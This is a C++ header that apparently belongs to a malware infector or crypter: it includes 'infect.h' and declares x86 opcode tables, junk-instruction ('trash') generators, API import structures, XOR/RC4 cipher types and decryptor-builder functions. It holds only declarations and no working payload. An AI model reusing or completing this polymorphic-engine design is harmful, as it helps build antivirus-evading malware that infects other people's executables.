#pragma once
#include "common.h"
#include "infect.h"

enum REG{
	_EAX=0,
	_ECX=1,
	_EDX=2,
	_EBX=3,
	_ESP=4,
	_EBP=5,
	_ESI=6,
	_EDI=7,
};

enum OP2{
	_XOR = 0x30,
	_ADD = 0x00,
	_SUB = 0x28,
	_AND = 0x20,
	_OR = 0x08,
	_MOV = 0x88,
	_CMP = 0x38,
	_TEST =0x82,
};

enum TYPE_OP{
	T_OP_RR = 0,
	T_OP_ArR =1,
	T_OP_RAr =2,

	T_OP_LR = 3,
	T_OP_RL = 4,
	T_OP_RC = 5,
	T_OP_LC = 6,

	T_OP_AC = 7,
	T_OP_RA = 8,
	T_OP_AR = 9,
	T_LEA_RRA = 10,
	T_LEA_RA = 11,
	T_SHR_RC = 12,
	T_SHL_RC = 13,
	T_DEC_L = 14,
	T_INC_L = 15,
	T_DEC_R = 16,
	T_INC_R = 17,
};

struct TRASH_ITEM{
	uint32 reg; //ind reg
	uint32 var; //ind local var
	bool st;
	bool l_st;
};

struct TRASH{
	TRASH_ITEM reg[8];
	uint32 sl;
	uint32 data;
	uint32 d_size;
	uint32 base;
	uint32 type;
	uint32 l_size;
	uint32 lc;
};

const uint32 _OP_TYPE[]={_MOV,_XOR,_ADD,_SUB,_AND,_OR};//,_CMP,_TEST};
const uint32 _REG[]={_EAX,_ECX,_EDX,_EBX,_ESI,_EDI};
const uint32 _OP1[]={T_OP_RR,T_OP_LR,T_OP_RL,T_OP_RC};
const uint32 _OP2[]={T_OP_LC,T_DEC_L,T_INC_L,T_SHR_RC,T_DEC_R,T_INC_R,T_SHL_RC,T_LEA_RA,T_LEA_RRA};
const uint32 _OP3[]={T_OP_AR,T_OP_RA,T_OP_AC,T_OP_ArR,T_OP_RAr};

#pragma pack (push,1)

struct OPCODE_2{
	uint8 o1;
	uint8 o2;
};

struct OPCODE_3{
	uint8 o1;
	uint8 o2;
	uint8 o3;
};


struct OPCODE_5{
	uint8 o1;
	uint32 s;
};

struct OPCODE_6{
	uint8 o1;
	uint8 o2;
	uint32 s;
};

struct ITEM_API{
	uint32 rva_addr;
	uint32 rva_name;
	uint32 offset_addr;
	uint32 offset_name;
};

struct LIST_API{
	uint32 count;
	ITEM_API *list;
};

struct GEN_CALL{
	uint32 offset;
	uint32 len;
	uint32 loc;
	uint32 narg;
};

struct GEN_OP{
	uint32 reg1;
	uint32 reg2;
	uint32 c1;
	uint32 c2;
	uint32 loc;
	uint32 op;
	uint32 subop;
	uint32 narg;
	bool st;
};

struct GEN_ITEM_CALL{
	uint32 offset;
	uint32 narg;
};

struct GEN_LIST_CALL{
	uint32 count;
	GEN_ITEM_CALL *list;
};

enum CRYPT{
	_CIP_XOR = 0,
	_CIP_ADD = 1,
	_CIP_SUB = 2,
	_CIP_RC4 = 3,
	_CIP_TRASH =4,
};

#pragma pack (pop)

void build();
bool add_block(BLOCK *b,uint8* data,int size);
int build_decrypt(BLOCK *b,uint32 base,uint32 start,uint32 d_rva,int len_d,int size,uint32 key,BLOCK *list,uint32 e,uint8 type);
int build_decrypt1(BLOCK *b,uint32 base,uint32 d_rva,int len_d,int size,uint32 key,BLOCK *list,uint32 e);
void gen_trash(BLOCK *b,TRASH *t);
int get_var(TRASH *t);
int gen_call(BLOCK *b,GEN_CALL *gc,BLOCK *in);
void restore_regs(BLOCK *b,TRASH *t);
void restore_reg(BLOCK *b,TRASH *t,int i);
uint32 gen_op(BLOCK *b,GEN_OP *c);
void gen_call_op(BLOCK *b,TRASH *t,GEN_OP *o);
//void gen_list_call(BLOCK *b,TRASH *t,GEN_OP *o,GEN_ITEM_CALL *it);
void gen_list_call(BLOCK *b,TRASH *t,GEN_OP *o,GEN_ITEM_CALL *it,GEN_LIST_CALL *lc);
void gen_tree_op(BLOCK *b,TRASH *t,GEN_OP *o,GEN_ITEM_CALL *it);
void build_trash_decryp(BLOCK *b,uint32 key,uint32 d,uint32 size,uint32 e,GEN_ITEM_CALL *it);
int _OP_RAr(BLOCK *b,uint32 o,uint8 r1,uint8 r2);